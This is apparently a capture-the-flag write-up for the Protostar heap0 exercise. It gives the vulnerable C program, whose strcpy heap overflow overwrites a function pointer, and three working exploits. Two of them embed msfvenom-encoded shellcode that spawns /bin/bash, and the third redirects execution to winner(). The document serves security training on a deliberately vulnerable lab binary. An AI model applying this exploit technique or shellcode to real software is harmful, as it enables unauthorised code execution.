### challenge
```txt
About
This level introduces heap overflows and how they can influence code flow.

This level is at /opt/protostar/bin/heap0
```

### heap0.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

### solution 1
```py
#!/usr/bin/python
from struct import pack

# msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b '\x00\x09'
# x86/shikata_ga_nai chosen with final size 72
# Payload size: 72 bytes
# Final size of python file: 358 bytes
buf =  ""
buf += "\xdb\xd9\xd9\x74\x24\xf4\xbb\x95\x13\xd3\xbb\x58\x2b"
buf += "\xc9\xb1\x0c\x31\x58\x18\x03\x58\x18\x83\xe8\x69\xf1"
buf += "\x26\xd1\x9a\xae\x51\x74\xfa\x26\x4f\x1a\x8b\x50\xe7"
buf += "\xf3\xf8\xf6\xf8\x63\xd1\x64\x90\x1d\xa4\x8a\x30\x0a"
buf += "\xbc\x4c\xb5\xca\xef\x2e\xdc\xa4\xc0\xcc\x7f\x4a\x76"
buf += "\x11\xd7\xff\x0f\xf0\x1a\x7f"

heap_offset = pack("<I", 0x804a054)
padding = "\x41"*72 

print padding + heap_offset + buf
```

### solution 2
```sh
# one liner
./heap0 `python -c 'from struct import pack;print "\x41"*72 + pack("<I", 0x804a054) + "\xba\x33\xc3\x1d\xbe\xd9\xc2\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x0c\x83\xe8\xfc\x31\x50\x0f\x03\x50\x3c\x21\xe8\xd4\x49\xfd\x8a\x7b\x2b\x95\x81\x18\x3a\x82\xb2\xf1\x4f\x25\x43\x66\x80\xd7\x2a\x18\x57\xf4\xff\x0c\x6d\xfb\xff\xcc\x5e\x99\x96\xa2\x8f\x3f\x08\x48\xa7\xbf\x9d\xfd\xbe\x21\xec\x82"'`
```

#### solution 3
```txt
user@protostar:/opt/protostar/bin$ objdump -d heap0 | grep winner
08048464 <winner>:
08048478 <nowinner>:
user@protostar:/opt/protostar/bin$

user@protostar:/opt/protostar/bin$ ./heap0 `python -c 'from struct import pack;print "\x41"*72 + pack("<I", 0x08048464)'`
data is at 0x804a008, fp is at 0x804a050
level passed
```